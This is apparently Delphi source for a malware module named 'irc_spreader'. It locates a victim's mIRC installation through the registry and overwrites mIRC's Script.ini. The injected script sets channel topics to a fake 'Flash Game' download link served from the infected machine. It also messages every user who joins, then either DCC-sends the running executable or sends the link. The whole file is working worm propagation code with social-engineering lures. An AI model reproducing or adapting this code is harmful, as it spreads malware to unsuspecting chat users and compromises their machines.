(* created by p0ke *)
unit irc_spreader;

interface

uses
  Windows, Winsock;

type
  TIPs             = ARRAY[0..10] OF STRING;

Var
  IPs : TIPs;

  Function StartIRC: Bool;

implementation

PROCEDURE GetIPs(VAR IPs:TIPS;VAR NumberOfIPs:BYTE);
TYPE
  TaPInAddr = ARRAY [0..10] OF PInAddr;
  PaPInAddr = ^TaPInAddr;
VAR
  phe       : PHostEnt;
  pptr      : PaPInAddr;
  Buffer    : ARRAY [0..63] OF Char;
  I         : Integer;
  GInitData : TWSAData;
BEGIN
  WSAStartup($101,GInitData);
  GetHostName(Buffer,SizeOf(Buffer));
  phe:=GetHostByName(Buffer);
  IF phe=NIL THEN Exit;
  pPtr:=PaPInAddr(phe^.h_addr_list);
  I:=0;
  WHILE pPtr^[I]<>NIL DO BEGIN
    IPs[I]:=inet_ntoa(pptr^[I]^);
    NumberOfIPs:=I;
    Inc(I);
  END;
  WSACleanup;
END;

Function GetLocalIP: String;
VAR
  NumberOfIPs : Byte;
  I           : Byte;
  IP          : STRING;
Begin
  GetIPs(IPs,NumberOfIPs);
  FOR I:=0 TO NumberOfIPs DO
    IP:=IPs[I];
  Result := IP;
End;

Function GetRegValue(Root: HKey; Path, Value: String): String;
Var
  Key:  HKey;
  Siz:  Cardinal;
  Val:  Array[0..16382] Of Char;
Begin
  Try
  //------------------------------
    ZeroMemory(@Val, SizeOf(Val));
    Siz := 16382;

    RegOpenKeyEx(Root, pChar(Path), 0, REG_SZ, KEY);
    RegQueryValueEx(KEY, pChar(Value), NIL, NIL, @Val[0], @Siz);
    RegCloseKey(KEY);

    If (Val <> '') Then
      Result := Val;
  //------------------------------
  Except
    Result := '';
  End;
End;

Function mIRCexist: Bool;
Begin
  Result := False;
  If (GetRegValue(HKEY_CLASSES_ROOT, 'ChatFile\DefaultIcon', '') <> '') Then
    Result := True;
End;

Function mIRCPath: String;
Begin
  If (mIRCExist) Then
    Result := GetRegValue(HKEY_CLASSES_ROOT, 'ChatFile\DefaultIcon', '');
End;

function ExtractFilePath(const Path: string): string;
var
  i, L: integer;
  Ch: Char;
begin
  L := Length(Path);
  for i := L downto 1 do
  begin
    Ch := Path[i];
    if (Ch = '\') or (Ch = '/') then
    begin
      Result := Copy(Path, 1, i);
      Break;
    end;
  end;
end;

Function StartIRC: Bool;
Var
  F     :TextFile;
  Script:String;
  Path  :String;
Begin
  Result := False;
  If Not (mIRCExist) Then Exit;
  Path := mIRCPath;
  Path := ExtractFilePath(Path)+'Script.ini';
  Delete(Path, 1, 1);

  Script :=
  'on *:OP:*:{'#13#10+
  '  if ($opnick == $me)'#13#10+
  '  {'#13#10+
  '    TOPIC $chan LOL (Flash Game) -> http://'+ GetLocalIP +':83/Pinguin.exe'#13#10+
  '  }'#13#10'}'#13#10#13#10+

  'on *:JOIN:#:{'#13#10+
  '  MSG $nick hey, check this out'#13#10+
  '  set %rn $rand(0,1)'#13#10+
  '  if (%rn == 0) { dcc send $nick "'+ParamStr(0)+'" }'#13#10+
  '  if (%rn == 1) { msg $nick http://'+ GetLocalIP +':83/Pinguin.exe'#13#10+
  '  }';

  CopyFile(pChar(Path), pChar(Path+'-backup'), False);

  AssignFile(F, Path);
  ReWrite(F);
  Write(F, Script);
  CloseFile(F);
  Result := True;
End;

end.
